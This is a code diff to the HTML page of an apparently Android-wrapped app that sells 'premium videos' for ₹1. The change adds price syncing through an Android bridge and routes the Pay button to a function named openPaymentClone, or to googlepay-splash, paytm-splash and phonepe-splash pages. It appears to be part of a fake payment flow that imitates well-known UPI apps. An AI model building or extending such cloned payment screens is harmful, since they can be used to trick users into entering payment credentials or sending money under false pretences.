@@ -54,7 +54,7 @@
 <body>
   <div class="container">
     <h2>Premium Access</h2>
-    <div class="price">₹1</div>
+    <div class="price" data-price-amount>₹1</div>
     <p>Unlock all premium videos</p>
     
     <div class="methods">
@@ -69,21 +69,52 @@
       </div>
     </div>
     
-    <button class="btn" onclick="selectPayment('gpay')">Pay Now</button>
+    <button
+      class="btn"
+      onclick="selectPayment('gpay')"
+      data-price-button="Pay {amount}"
+    >
+      Pay ₹1
+    </button>
   </div>
   
   <script>
+    function getPaymentAmount() {
+      try {
+        if (typeof Android !== 'undefined' && Android.getPaymentAmount) {
+          return Android.getPaymentAmount();
+        }
+      } catch (e) {}
+      return '₹1';
+    }
+
+    function syncPriceContent() {
+      const amount = getPaymentAmount();
+      document.querySelectorAll('[data-price-amount]').forEach(function(el) {
+        el.textContent = amount;
+      });
+      document.querySelectorAll('[data-price-button]').forEach(function(el) {
+        const template = el.getAttribute('data-price-button') || '{amount}';
+        el.textContent = template.replace('{amount}', amount);
+      });
+    }
+
+    syncPriceContent();
+
     function selectPayment(method) {
       if (typeof Android !== 'undefined' && Android.openPaymentClone) {
-        Android.openPaymentClone(method);
-      } else {
-        if (method === 'gpay') {
-          window.location.href = 'googlepay-splash.html';
-        } else if (method === 'paytm') {
-          window.location.href = 'paytm-splash.html';
-        } else if (method === 'phonepe') {
-          window.location.href = 'phonepe-splash.html';
-        }
+        try {
+          Android.openPaymentClone(method);
+          return;
+        } catch (e) {}
+      }
+
+      if (method === 'gpay') {
+        window.location.href = 'googlepay-splash.html';
+      } else if (method === 'paytm') {
+        window.location.href = 'paytm-splash.html';
+      } else if (method === 'phonepe') {
+        window.location.href = 'phonepe-splash.html';
       }
     }
     
